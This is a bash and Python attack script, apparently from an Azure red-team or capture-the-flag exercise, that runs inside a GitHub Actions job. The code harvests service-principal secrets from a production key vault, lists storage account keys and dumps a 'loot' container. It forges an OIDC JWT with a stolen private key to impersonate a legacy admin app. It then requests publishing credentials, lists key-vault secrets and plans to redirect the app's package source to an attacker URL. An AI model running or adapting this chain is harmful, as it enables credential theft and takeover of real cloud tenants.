#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
REPORTING_RG="rg-tbl-reporting-prod-eus"
PLATFORM_RG="rg-tbl-platform-prod-sea"
STORAGE_ACCT="sttblcilogsprodx3euoz"
KV_PROD="kv-tbl-prod-x3euoz"
KV_SEC="kv-tbl-sec-x3euoz"
LEGACY_APPID="891fb158-e02c-4428-a885-53b811f369c0"
OIDC_ISS="https://sttblcilogsprodx3euoz.z23.web.core.windows.net"
OIDC_SUB="vcb-subject"
JWKS_PATH="vcb7/.well-known/jwks.json"
JWKS_URL="$OIDC_ISS/$JWKS_PATH"
WEB_CONTAINER="\$web"

# 1. Login as cicd-deployer
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none
echo "=== cicd-deployer OK ==="

python3 -I << 'PYEOF'
import os, json, urllib.request, urllib.parse, urllib.error, hashlib, hmac, base64, time, datetime, uuid

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
REPORTING_RG = "rg-tbl-reporting-prod-eus"
PLATFORM_RG = "rg-tbl-platform-prod-sea"
STORAGE_ACCT = "sttblcilogsprodx3euoz"
KV_PROD = "kv-tbl-prod-x3euoz"
KV_SEC = "kv-tbl-sec-x3euoz"
LEGACY_APPID = "891fb158-e02c-4428-a885-53b811f369c0"
OIDC_ISS = "https://sttblcilogsprodx3euoz.z23.web.core.windows.net"
OIDC_SUB = "vcb-subject"
ARM_BASE = "https://management.azure.com"

def sp_tok(cid, sec, scope):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({"client_id": cid, "client_secret": sec,
                "grant_type": "client_credentials", "scope": scope}).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token", "")
    except Exception as e: return f"ERR:{e}"

def http(url, tok, method="GET", data=None, extra_headers=None):
    h = {"Authorization": "Bearer " + tok}
    if extra_headers: h.update(extra_headers)
    if data:
        if isinstance(data, dict): data = json.dumps(data).encode(); h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode(errors="replace")[:800]
    except Exception as e: return 0, str(e)[:200]

# Get cicd-deployer ARM token
def get_az_token(resource="https://management.azure.com/"):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource={resource}",
            headers={"Metadata": "true"}), timeout=10)
        return json.loads(r.read()).get("access_token","ERR:IMDS_FAIL")
    except: return "ERR:IMDS_FAIL"

# Use az CLI for cicd-deployer tokens
import subprocess
def az_tok(resource):
    try:
        r = subprocess.run(["az", "account", "get-access-token", "--resource", resource,
            "--query", "accessToken", "-o", "tsv"], capture_output=True, text=True, timeout=20)
        return r.stdout.strip()
    except Exception as e: return f"ERR:{e}"

CICD_ARM = az_tok("https://management.azure.com/")
print(f"cicd ARM len={len(CICD_ARM)}")

# Get all SP credentials from KV prod
sp_creds = {}
for name in ["reporting-service-principal", "reporting-viewer-principal", "secrets-sync-principal",
             "sync-service-principal", "cost-reader-principal", "directory-audit-principal"]:
    try:
        s,b = http(f"https://{KV_PROD}.vault.azure.net/secrets/{name}?api-version=7.4",
                   az_tok("https://vault.azure.net/"))
        if s == 200:
            v = json.loads(json.loads(b)["value"])
            sp_creds[name] = v
    except: pass

print(f"Got {len(sp_creds)} SP creds")

# Get sync-service ARM token (to list storage)
sync_cid = sp_creds.get("sync-service-principal",{}).get("appId","")
sync_sec = sp_creds.get("sync-service-principal",{}).get("clientSecret","")
RS_CID = sp_creds.get("reporting-service-principal",{}).get("appId","")
RS_SEC = sp_creds.get("reporting-service-principal",{}).get("clientSecret","")

# List ALL blobs in loot container
print("\n=== LOOT CONTAINER ===")
if sync_cid and sync_sec:
    SYNC_ARM = sp_tok(sync_cid, sync_sec, "https://management.azure.com/.default")
    SYNC_STOR = sp_tok(sync_cid, sync_sec, "https://storage.azure.com/.default")
    print(f"sync ARM len={len(SYNC_ARM)} stor len={len(SYNC_STOR)}")

    if not SYNC_ARM.startswith("ERR"):
        # List storage keys
        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Storage/storageAccounts/{STORAGE_ACCT}/listKeys?api-version=2021-09-01", SYNC_ARM, method="POST")
        print(f"listKeys: {s}")
        if s == 200:
            keys = json.loads(b)["keys"]
            stor_key = keys[0]["value"]
            print(f"Got storage key len={len(stor_key)}")
            # Now list ALL containers
            for container in ["loot", "ci-logs", "$web"]:
                try:
                    ts = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
                    date_str = ts
                    canonicalized = f"GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:{date_str}\nx-ms-version:2021-06-08\n/{STORAGE_ACCT}/{container}\nrestype:container\ncomp:list"
                    sig = base64.b64encode(hmac.new(base64.b64decode(stor_key), canonicalized.encode(), hashlib.sha256).digest()).decode()
                    auth_hdr = f"SharedKey {STORAGE_ACCT}:{sig}"
                    r = urllib.request.urlopen(urllib.request.Request(
                        f"https://{STORAGE_ACCT}.blob.core.windows.net/{container}?restype=container&comp=list",
                        headers={"Authorization": auth_hdr, "x-ms-date": date_str, "x-ms-version": "2021-06-08"}
                    ), timeout=20)
                    blobs_xml = r.read().decode()
                    print(f"\n[{container}] blobs:")
                    import re
                    names = re.findall(r'<Name>([^<]+)</Name>', blobs_xml)
                    for nm in names: print(f"  {nm}")
                    # Read each blob in loot
                    if container == "loot":
                        for nm in names:
                            try:
                                ts2 = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
                                c2 = f"GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:{ts2}\nx-ms-version:2021-06-08\n/{STORAGE_ACCT}/{container}/{nm}"
                                sig2 = base64.b64encode(hmac.new(base64.b64decode(stor_key), c2.encode(), hashlib.sha256).digest()).decode()
                                r2 = urllib.request.urlopen(urllib.request.Request(
                                    f"https://{STORAGE_ACCT}.blob.core.windows.net/{container}/{nm}",
                                    headers={"Authorization": f"SharedKey {STORAGE_ACCT}:{sig2}", "x-ms-date": ts2, "x-ms-version": "2021-06-08"}
                                ), timeout=15)
                                blob_content = r2.read().decode(errors="replace")
                                print(f"  [{nm}] content: {blob_content[:500]}")
                            except Exception as e: print(f"  [{nm}] read err: {e}")
                except Exception as e: print(f"[{container}] err: {e}")

# Get tbl-legacy-admin ARM token via OIDC forge
print("\n=== TBL-LEGACY-ADMIN ARM TOKEN ===")
try:
    # Need our RSA private key and storage key to forge JWT
    # Get storage key first (already have it above if sync worked)
    if sync_cid and sync_sec and not SYNC_ARM.startswith("ERR"):
        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Storage/storageAccounts/{STORAGE_ACCT}/listKeys?api-version=2021-09-01", SYNC_ARM, method="POST")
        if s == 200:
            stor_key = json.loads(b)["keys"][0]["value"]
            # Read our RSA private key from $web
            # The key was stored at vcb7/.well-known/private_key.pem or similar
            # Let's read the JWKS to find our key
            ts3 = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
            key_paths = ["vcb7/private_key.pem", "vcb7/.well-known/private_key.pem", "private_key.pem"]
            for kp in key_paths:
                try:
                    c3 = f"GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:{ts3}\nx-ms-version:2021-06-08\n/{STORAGE_ACCT}/$web/{kp}"
                    sig3 = base64.b64encode(hmac.new(base64.b64decode(stor_key), c3.encode(), hashlib.sha256).digest()).decode()
                    r3 = urllib.request.urlopen(urllib.request.Request(
                        f"https://{STORAGE_ACCT}.blob.core.windows.net/$web/{kp}",
                        headers={"Authorization": f"SharedKey {STORAGE_ACCT}:{sig3}", "x-ms-date": ts3, "x-ms-version": "2021-06-08"}
                    ), timeout=15)
                    priv_key = r3.read().decode()
                    print(f"Found private key at {kp} len={len(priv_key)}")

                    # Forge JWT for tbl-legacy-admin
                    from cryptography.hazmat.primitives import serialization, hashes
                    from cryptography.hazmat.primitives.asymmetric import padding
                    from cryptography.hazmat.backends import default_backend
                    priv = serialization.load_pem_private_key(priv_key.encode(), password=None, backend=default_backend())

                    now = int(time.time())
                    header = {"alg": "RS256", "typ": "JWT"}
                    claims = {"iss": OIDC_ISS, "sub": OIDC_SUB, "aud": f"api://AzureADTokenExchange",
                              "iat": now, "exp": now + 600, "jti": str(uuid.uuid4())}

                    def b64url(data):
                        if isinstance(data, dict): data = json.dumps(data, separators=(",",":")).encode()
                        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

                    msg = f"{b64url(header)}.{b64url(claims)}"
                    sig_bytes = priv.sign(msg.encode(), padding.PKCS1v15(), hashes.SHA256())
                    jwt = f"{msg}.{b64url(sig_bytes)}"
                    print(f"Forged JWT len={len(jwt)}")

                    # Exchange for tbl-legacy-admin ARM token
                    for scope in ["https://management.azure.com/.default", "https://vault.azure.net/.default"]:
                        try:
                            r4 = urllib.request.urlopen(urllib.request.Request(
                                f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
                                data=urllib.parse.urlencode({
                                    "client_id": LEGACY_APPID,
                                    "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
                                    "client_assertion": jwt,
                                    "grant_type": "client_credentials",
                                    "scope": scope
                                }).encode(), method="POST"), timeout=20)
                            la_tok = json.loads(r4.read()).get("access_token","")
                            print(f"tbl-legacy-admin {scope.split('/')[2]} token len={len(la_tok)}")

                            if la_tok and scope.startswith("https://management.azure.com"):
                                # What can LA do with ARM?
                                s2,b2 = http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01", la_tok)
                                print(f"LA resources: {s2}:{b2[:500]}")
                                s3,b3 = http(f"{ARM_BASE}/subscriptions?api-version=2020-01-01", la_tok)
                                print(f"LA subscriptions: {s3}:{b3[:300]}")
                                LA_OID = "43834909-47cf-4a4a-8048-e323b4897ed3"
                                s4,b4 = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{LA_OID}%27", la_tok)
                                print(f"LA own roles: {s4}:{b4[:500]}")
                                # Try publishxml for reporting app
                                s5,b5 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/publishxml?api-version=2022-03-01", la_tok, method="POST")
                                print(f"LA publishxml: {s5}:{b5[:800]}")
                                # Try publishxml for storefront
                                s6,b6 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/publishxml?api-version=2022-03-01", la_tok, method="POST")
                                print(f"LA publishxml storefront: {s6}:{b6[:800]}")
                                # Try listPublishingCredentials
                                s7,b7 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01", la_tok, method="POST")
                                print(f"LA listpubcreds: {s7}:{b7[:800]}")

                            if la_tok and scope.startswith("https://vault.azure.net"):
                                s8,b8 = http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4", la_tok)
                                print(f"LA KV prod: {s8}:{b8[:500]}")
                                s9,b9 = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", la_tok)
                                print(f"LA KV sec: {s9}:{b9[:1000]}")
                        except Exception as e:
                            print(f"LA token err ({scope}): {e}")
                    break
                except Exception as e:
                    print(f"Key path {kp}: {e}")
except Exception as e:
    print(f"OIDC forge err: {e}")
    import traceback; traceback.print_exc()

# Try reporting-service with different Kudu actions
print("\n=== REPORTING-SERVICE ACTIONS ===")
if RS_CID and RS_SEC:
    RS_ARM = sp_tok(RS_CID, RS_SEC, "https://management.azure.com/.default")
    print(f"RS ARM len={len(RS_ARM)}")
    if RS_ARM and not RS_ARM.startswith("ERR"):
        # listPublishingCredentials (different from publishxml)
        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01", RS_ARM, method="POST")
        print(f"RS listpubcreds: {s}:{b[:800]}")

        # Get app settings via list
        s2,b2 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2022-03-01", RS_ARM, method="POST")
        print(f"RS appsettings: {s2}:{b2[:500]}")

        # Try to update WEBSITE_RUN_FROM_PACKAGE to a URL we control
        # First get current settings, then add our key
        if s2 == 200:
            settings = json.loads(b2)
            props = settings.get("properties", {})
            print(f"Current settings keys: {list(props.keys())[:20]}")

        # Try restart
        s3,b3 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2022-03-01", RS_ARM, method="POST")
        print(f"RS restart: {s3}:{b3[:200]}")

        # List all available site extensions
        s4,b4 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/extensions?api-version=2022-03-01", RS_ARM)
        print(f"RS extensions: {s4}:{b4[:500]}")

print("\n=== DONE ===")
PYEOF
echo "Script done"
